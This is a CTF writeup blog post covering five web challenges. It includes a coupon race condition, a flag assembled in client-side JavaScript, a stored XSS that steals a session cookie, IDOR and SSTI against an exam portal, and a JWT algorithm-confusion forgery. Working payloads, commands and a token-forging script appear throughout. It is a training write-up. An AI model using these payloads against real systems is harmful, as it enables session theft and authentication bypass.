---
title: "capture the ghost ctf writeups"
description: "web writeups for capture the ghost ctf - race condition coupon abuse, a captcha with the flag in its js, stored xss session theft, an exam portal leaking its own answers, and forging an rs256 jwt from a public jwks."
date: 2026-10-28
tags: ["ctf", "writeups", "web"]
cover: "/static/covers/pixyctg.png"
draft: false
---

# capture the ghost ctf writeups

solved a plenty of them, but i personally like to write on web challs.

## double spend

> the system trusts that a coupon can only be redeemed once, earn your way into the hidden vault.

the portal let me claim a coupon, but only once. one coupon wasn't enough to buy the flag.

classic race condition. i claimed the coupon, caught the redeem request in burp, sent a bunch of copies in parallel. the server checked "already used?" before any of them finished writing, so they all went through and my balance stacked up.

![parallel redeem requests in burp](/static/blog/capture-the-ghost/double-spend/DoubleSpendrequest.png)

enough balance, bought the flag.

![double spend flag](/static/blog/capture-the-ghost/double-spend/flag.png)

```
boo{double_spend_race_won}
```

## the dead ritual

> the ancient containment system is still online. unluckily, its captcha seems to have a mind of its own. prove you're human before the spirits take over.

first thing i did was look at the js.

```
https://80383184-75b2-4926-abc9-89a1b672ec45-c3.ctf.tanvish.dev/script.js
```

there was an `assembleFlag()` function building the flag out of character codes. so it was just sitting in the client the whole time.

![flag assembly in script.js](/static/blog/capture-the-ghost/dead-ritual/jsfunction.png)

i rebuilt it myself from the chunks:

```js
const chunks = [
  [98, 111, 111, 123],
  [116, 104, 51, 95],
  [100, 51, 52, 100, 95],
  [104, 52, 118, 51, 95],
  [98, 51, 51, 110, 95],
  [53, 116, 52, 98, 49, 108, 49, 122, 51, 100, 125]
];
console.log(chunks.map(c => String.fromCharCode(...c)).join(''));
```

![flag in console](/static/blog/capture-the-ghost/dead-ritual/consoleflag.png)

the intended way was to reveal and click the hidden stabilization button, or just call it:

```js
window.stabilizeRitual();
```

that drops you into the frame and you draw along to get the flag.

![intended path](/static/blog/capture-the-ghost/dead-ritual/intende.png)

![intended flag](/static/blog/capture-the-ghost/dead-ritual/intendedflag.png)

```
boo{th3_d34d_h4v3_b33n_5t4b1l1z3d}
```

## black hollow hotel

> the hotel's been closed since 1987. yet every night the registers are checked, new entries quietly acknowledged. retrieve the secret buried within.

the login form was a trap. the real path is stored xss into the guestbook, stealing the clerk's session.

`/admin` exists and redirects to `/admin/login`. the guestbook says submissions are "reviewed by the clerk", so a bot logs in and renders new entries on an internal console. the "beef meatloaf" text on the page is a hint pointing straight at browser exploitation.

the public guestbook jinja-escapes names, so a payload looks dead when you view it. it is not escaped on the clerk's review console. so i injected there, same-origin exfil back into the guestbook, no external server needed:

```bash
curl -X POST https://hotel.kathrinaelangbam.xyz:8089/guestbook \
  --data-urlencode 'name=<img src=x onerror="fetch(\"/guestbook\",{method:\"POST\",body:new URLSearchParams({name:\"LEAK_C_\"+document.cookie})})">'
```

![xss payload in burp](/static/blog/capture-the-ghost/black-hollow-hotel/burpxss.png)

the clerk bot loaded it and the next guestbook row leaked the cookie. not httponly:

```
sessionid=a4492c8e63d8f3d8f9e25197b5e0804f64fa703905a4244563d607fdafc70567
```

replayed it against the staff console:

```bash
curl -H 'Cookie: sessionid=a4492c8e63d8f3d8f9e25197b5e0804f64fa703905a4244563d607fdafc70567' \
  https://hotel.kathrinaelangbam.xyz:8089/admin
```

the night audit console rendered the flag.

```
boo{D0N7_H4V3_B33F_W17H_M3}
```

## !malpractice

> welcome to the vit ap fat examination portal. upgraded with state-of-the-art anti-cheating tech. no tab switching, no copy/paste, no excuses. the flag is split into 3 parts.

creds they gave:

```
email: student@vitap.ac.in
password: exam2024
```

big burp user here so straight to proxy.

**part 1.** i hit the questions endpoint first. the response handed back every answer key inline.

![answer keys in /api/questions](/static/blog/capture-the-ghost/malpractice/api-questions.png)

fed all those answers into `/api/submit-exam`.

![submit with full answers](/static/blog/capture-the-ghost/malpractice/api-submit.png)

got back a result blob:

```
eyJzdHVkZW50IjogIlNUVS0xODQyIiwgInNjb3JlIjogMTUwLCAidG90YWwiOiAxNTAsICJ2ZXJpZmllZCI6IHRydWUsICJpbnRlZ3JpdHlfaGFzaCI6ICJZbTl2ZTIwMGJIQnlOR00zTVdNelh6RnoifQ==
```

![part 1 hash](/static/blog/capture-the-ghost/malpractice/part1hash.png)

decoded that in burp, part 1:

![part 1 decoded](/static/blog/capture-the-ghost/malpractice/part1hashdecodeflag.png)

```
boo{m4lpr4c71c3_1s
```

**part 2.** the result url had an id in it. bumped it to the proctor's id 42 and it handed me the proctor token.

![proctor token](/static/blog/capture-the-ghost/malpractice/proctortoken.png)

```
eyJhZG1pbiI6IHRydWUsICJ0eXBlIjogInN5c3RlbV92YWxpZGF0aW9uIiwgInZlcmlmaWNhdGlvbl9rZXkiOiAiWDJwMU5YUmZkVzQwZFRkb01ISXhlak5rIiwgImxlZ2FjeV9zdGF0dXMiOiAibWlncmF0aW9uX3BlbmRpbmcifQ==
```

decoding that gave part 2:

![proctor flag decoded](/static/blog/capture-the-ghost/malpractice/proctorflagdecode.png)

```
_ju5t_un4u7h0r1z3d
```

**part 3.** the portal has a certificate generator and it was vulnerable to ssti.

```
https://80383184-75b2-4926-abc9-89a1b672ec45-c1.ctf.tanvish.dev/legacy-exam-portal/certificate
```

put `{{config}}` in the name field and part 3 was in the output.

![ssti on the certificate name](/static/blog/capture-the-ghost/malpractice/ssti.png)

```
_f34tur3_t3s71ng}
```

stitch the three together:

```
boo{m4lpr4c71c3_1s_ju5t_un4u7h0r1z3d_f34tur3_t3s71ng}
```

## blackwood manor

> register at the door and the manor hands you a paper guest badge. the séance room only opens for the medium. they stamp every badge with a wax seal to prove it's genuine, and they're so proud of it they left a copy out on the wall for everyone to admire.

made an account, logged in, went to `/seance`:

> your badge is genuine, but it reads role: guest. only a medium may sit at this table.

![role guest alert](/static/blog/capture-the-ghost/blackwood-manor/rolealert.png)

so i had to forge my jwt. it was signed rs256, which means i needed the private key... except the hint says the seal is public. dirsearch on the portal found it:

```
/.well-known/jwks.json
```

![dirsearch finding jwks](/static/blog/capture-the-ghost/blackwood-manor/dirsearch.png)

rs256 verification only uses the public key. if the server also accepts hs256, you can sign a token with hmac using that public key as the secret and it validates. so i turned the jwk into a pem:

```python
import base64
from Crypto.PublicKey import RSA

n = "8bd1FiCnry16B0QjuvpIXCK3uFm2ZTKAhpKMZb2-Qa3YuolZL7zURKoZbtDPj1Mn5OE1nMdFspr6sZZCQmG1TVtaaLXY9VYSoA2mQs0Fk49k7piUIlVMeCFBYYF4SxVpTRL5JwPu5_pJZ3psRWvGs6Kz4TZy--eRqXnTeT4TcHr1_1rHxoRscQ0QkECcKqp8eLbv9YhBRbHiKJCPoJRMDGhBvE-4zGOtsRM74syHJJAG4phaffaNQM0PMeQOIeLAJAhJjT9oIkGjEV8_YEAEGS8pJvIV99h1KKYnQ03hOHXIAohgl3e24iRkJoTEfyqiH_X2TyNoGiS62sXQDUiV3w"
e = "AQAB"

def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

n_int = int.from_bytes(b64url_decode(n), "big")
e_int = int.from_bytes(b64url_decode(e), "big")

key = RSA.construct((n_int, e_int))
pem = key.export_key("PEM")
print(pem.decode())
```

which gave:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8bd1FiCnry16B0QjuvpI
XCK3uFm2ZTKAhpKMZb2+Qa3YuolZL7zURKoZbtDPj1Mn5OE1nMdFspr6sZZCQmG1
TVtaaLXY9VYSoA2mQs0Fk49k7piUIlVMeCFBYYF4SxVpTRL5JwPu5/pJZ3psRWvG
s6Kz4TZy++eRqXnTeT4TcHr1/1rHxoRscQ0QkECcKqp8eLbv9YhBRbHiKJCPoJRM
DGhBvE+4zGOtsRM74syHJJAG4phaffaNQM0PMeQOIeLAJAhJjT9oIkGjEV8/YEAE
GS8pJvIV99h1KKYnQ03hOHXIAohgl3e24iRkJoTEfyqiH/X2TyNoGiS62sXQDUiV
3wIDAQAB
-----END PUBLIC KEY-----
```

then used jwt_tool to re-sign with the key confusion, flipping role to medium:

```bash
python jwt_tool.py "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Im1hbm9yLXNlYWwtMjAyNCJ9..." \
  -X k -pk public.pem -I -pc role -pv medium
```

![jwt_tool forging the token](/static/blog/capture-the-ghost/blackwood-manor/jwt_tool.png)

new token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Im1hbm9yLXNlYWwtMjAyNCJ9.eyJzdWIiOiJiYWthIiwibmFtZSI6ImJha2EiLCJyb2xlIjoibWVkaXVtIiwiaWF0IjoxNzkzMTg4MjA0fQ.FTRapuOynW7Tv1D_bILuvBB2wzCXUjQSu8athVZ0nss
```

sat down at the table with that token and got the flag.

![blackwood manor flag](/static/blog/capture-the-ghost/blackwood-manor/flag.png)

```
boo{th3_w4x_s34l_w4s_publ1c_4ll_4l0ng}
```
